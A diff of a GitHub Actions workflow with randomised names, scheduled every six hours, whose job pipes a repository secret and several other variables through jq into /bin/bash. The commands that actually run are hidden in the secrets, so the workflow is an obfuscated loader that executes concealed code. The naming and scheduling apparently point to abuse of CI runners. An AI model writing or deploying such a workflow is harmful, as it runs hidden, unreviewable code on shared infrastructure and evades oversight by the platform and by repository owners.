@@ -1,10 +1,10 @@
 name: meiruren4617
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 1/6 * * *'
-
-jobs:  # 28402
+    - cron: '28 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +12,17 @@ jobs:  # 28402
       - uses: actions/checkout@v4
       - name: meiruren4617
         env:
-          ui4: ${{ secrets.ui4 }}
+          gmkjz63066: ${{ secrets.gmkjz63066 }}
         run: |
-          echo $ui4 | jq -r .ry24717 | /bin/bash
-          echo $qaxx28 | jq -r .h92 | /bin/bash
-          echo $sz818 | jq -r .pxu6121 | /bin/bash
-          echo $vtffi6 | jq -r .zrgar04 | /bin/bash
-          echo $yx41 | jq -r .yeucd687 | /bin/bash
-          echo $tjss27 | jq -r .fr1463 | /bin/bash
-          echo $ztkv481 | jq -r .tn98478 | /bin/bash
-          echo $sfpri91721 | jq -r .nyxp1981 | /bin/bash
+          echo $gmkjz63066 | jq -r .s2 | /bin/bash
+          echo $kffni252 | jq -r .qcyvd294 | /bin/bash
+          echo $mdra708 | jq -r .i130 | /bin/bash
+          echo $xz804 | jq -r .qye61 | /bin/bash
+          echo $gg72605 | jq -r .qf2 | /bin/bash
+          echo $sqpmi4159 | jq -r .n07 | /bin/bash
+          echo $sutt34 | jq -r .ndpd2 | /bin/bash
+          echo $qor03862 | jq -r .zc4780 | /bin/bash
+          echo $tprlt15 | jq -r .zjdt55169 | /bin/bash
+          echo $j2 | jq -r .sb2 | /bin/bash
+          echo $n16414 | jq -r .jgkj3097 | /bin/bash
 
